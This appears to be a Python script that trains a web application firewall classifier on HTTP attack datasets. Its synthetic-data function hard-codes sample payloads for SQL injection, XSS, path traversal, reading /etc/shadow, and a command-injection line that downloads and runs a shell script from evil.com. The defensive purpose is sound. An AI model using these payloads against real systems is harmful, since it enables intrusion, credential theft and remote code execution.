"""
Enterprise CyberNexus — WAF NLP Training Script

Trains the 1D-CNN + BiLSTM WAF NLP model on:
  - CSIC 2010 HTTP Dataset     (SQLi, XSS, LFI attacks against web apps)
  - Kaggle Malicious URLs      (URL classification: phishing, malware, benign)
  - OWASP CRS synthetic data   (generated from ModSecurity rule patterns)

Usage:
    python -m ml.training.waf_nlp.train \
        --csic   datasets/csic_http.csv \
        --urls   datasets/malicious_urls.csv \
        --epochs 20 \
        --output ml/models/waf/waf_nlp_model.pt

Expected CSV columns:
    csic_http.csv    : payload (str), label (int 0-5)
    malicious_urls.csv: url (str), type (benign/defacement/phishing/malware)
"""

import argparse
import logging
import os
import random
from typing import List, Tuple

logger = logging.getLogger(__name__)

LABEL_MAP_URLS = {
    "benign":      0,
    "defacement":  3,   # maps to lfi_path_traversal category
    "phishing":    5,
    "malware":     4,   # maps to command_injection (closest)
}


# ──────────────────────────────────────────────
#  Data loading helpers
# ──────────────────────────────────────────────

def load_csic(path: str) -> List[Tuple[str, int]]:
    """Load CSIC HTTP dataset. Expected: payload,label columns."""
    import csv
    samples = []
    with open(path, encoding='utf-8', errors='replace') as f:
        reader = csv.DictReader(f)
        for row in reader:
            samples.append((row['payload'], int(row['label'])))
    logger.info("CSIC: loaded %d samples", len(samples))
    return samples


def load_malicious_urls(path: str) -> List[Tuple[str, int]]:
    """Load Kaggle malicious URLs dataset. Expected: url, label, source columns."""
    import csv
    samples = []
    try:
        with open(path, encoding='utf-8', errors='replace') as f:
            reader = csv.DictReader(f)
            for row in reader:
                if 'url' not in row:
                    continue
                lbl = str(row.get('label', '0'))
                src = str(row.get('source', '')).lower()
                
                if lbl == '1':
                    if 'phish' in src:
                        mapped_label = 5  # phishing
                    elif 'malware' in src:
                        mapped_label = 4  # cmd_inj / malicious
                    else:
                        mapped_label = 5  # default malicious to phishing
                else:
                    mapped_label = 0
                
                samples.append((row['url'], mapped_label))
                if len(samples) >= 100000:  # limit to prevent memory issues
                    break
        logger.info("Malicious URLs: loaded %d samples", len(samples))
    except Exception as e:
        logger.error("Failed to load URLs dataset %s: %s", path, e)
    return samples

def generate_synthetic_attacks(n: int = 5000) -> List[Tuple[str, int]]:
    """
    Generate minimal synthetic attack samples for bootstrapping
    when external datasets are not yet downloaded.
    """
    sqli_templates = [
        "' OR '1'='1",
        "1; DROP TABLE users--",
        "' UNION SELECT username,password FROM users--",
        "admin'--",
        "1 OR SLEEP(5)--",
    ]
    xss_templates = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert(document.cookie)",
        "<svg onload=alert(1)>",
    ]
    lfi_templates = [
        "../../etc/passwd",
        "../../../windows/system32/cmd.exe",
        "....//....//etc/passwd",
    ]
    cmd_templates = [
        "; ls -la",
        "| cat /etc/shadow",
        "; wget http://evil.com/shell.sh -O /tmp/s && sh /tmp/s",
    ]

    samples = []
    benign = ["hello world", "search=items&page=1", "/products/123", "user=admin&pass=1234"]

    for _ in range(n // 5):
        samples.append((random.choice(sqli_templates), 1))
        samples.append((random.choice(xss_templates),  2))
        samples.append((random.choice(lfi_templates),  3))
        samples.append((random.choice(cmd_templates),  4))
        samples.append((random.choice(benign),         0))

    logger.info("Synthetic: generated %d samples", len(samples))
    return samples


# ──────────────────────────────────────────────
#  Training
# ──────────────────────────────────────────────

def train(
    samples:     List[Tuple[str, int]],
    output_path: str,
    epochs:      int = 20,
    batch_size:  int = 64,
    lr:          float = 1e-3,
    val_split:   float = 0.1,
) -> None:
    """Train the WAFNLPModel and save weights."""
    try:
        import torch
        import torch.nn as nn
        from torch.utils.data import DataLoader, TensorDataset
    except ImportError:
        logger.error("PyTorch required: pip install torch")
        return

    from .model import WAFNLPModel, CharTokenizer

    tokenizer = CharTokenizer()

    # ── Encode ─────────────────────────────────
    random.shuffle(samples)
    texts, labels = zip(*samples)
    X = torch.tensor([tokenizer.encode(t) for t in texts], dtype=torch.long)
    y = torch.tensor(labels, dtype=torch.long)

    # ── Split ──────────────────────────────────
    n_val   = max(1, int(len(X) * val_split))
    X_val,  X_train = X[:n_val],  X[n_val:]
    y_val,  y_train = y[:n_val],  y[n_val:]

    train_ds = TensorDataset(X_train, y_train)
    val_ds   = TensorDataset(X_val,   y_val)
    train_dl = DataLoader(train_ds, batch_size=batch_size, shuffle=True)
    val_dl   = DataLoader(val_ds,   batch_size=batch_size)

    # ── Model ──────────────────────────────────
    model     = WAFNLPModel()
    optimizer = torch.optim.Adam(model.parameters(), lr=lr)
    criterion = nn.CrossEntropyLoss()

    logger.info("Training WAFNLPModel for %d epochs on %d samples…", epochs, len(X_train))

    for epoch in range(1, epochs + 1):
        model.train()
        total_loss = 0.0
        for xb, yb in train_dl:
            optimizer.zero_grad()
            logits = model(xb)
            loss   = criterion(logits, yb)
            loss.backward()
            optimizer.step()
            total_loss += loss.item()

        # Validation accuracy
        model.eval()
        correct = total = 0
        with torch.no_grad():
            for xb, yb in val_dl:
                preds   = model(xb).argmax(dim=-1)
                correct += (preds == yb).sum().item()
                total   += len(yb)

        val_acc = correct / max(total, 1) * 100
        logger.info(
            "Epoch %3d/%d  loss=%.4f  val_acc=%.1f%%",
            epoch, epochs, total_loss / len(train_dl), val_acc
        )

    # ── Save ───────────────────────────────────
    os.makedirs(os.path.dirname(output_path) or '.', exist_ok=True)
    torch.save(model.state_dict(), output_path)
    logger.info("✅ Model saved → %s", output_path)


# ──────────────────────────────────────────────
#  CLI Entry point
# ──────────────────────────────────────────────

def main() -> None:
    logging.basicConfig(level=logging.INFO, format='%(levelname)s %(message)s')
    parser = argparse.ArgumentParser(description="Train WAF NLP Model")
    parser.add_argument('--csic',    default=None, help='Path to CSIC HTTP CSV')
    parser.add_argument('--urls',    default=None, help='Path to Malicious URLs CSV')
    parser.add_argument('--epochs',  type=int, default=20)
    parser.add_argument('--batch',   type=int, default=64)
    parser.add_argument('--output',  default='ml/models/waf/waf_nlp_model.pt')
    args = parser.parse_args()

    samples: List[Tuple[str, int]] = []

    if args.csic and os.path.exists(args.csic):
        samples += load_csic(args.csic)
    if args.urls and os.path.exists(args.urls):
        samples += load_malicious_urls(args.urls)

    # Always add synthetic data for bootstrapping
    samples += generate_synthetic_attacks(n=5000)

    if not samples:
        logger.error("No training data found. Provide --csic or --urls")
        return

    train(samples, args.output, epochs=args.epochs, batch_size=args.batch)


if __name__ == '__main__':
    main()
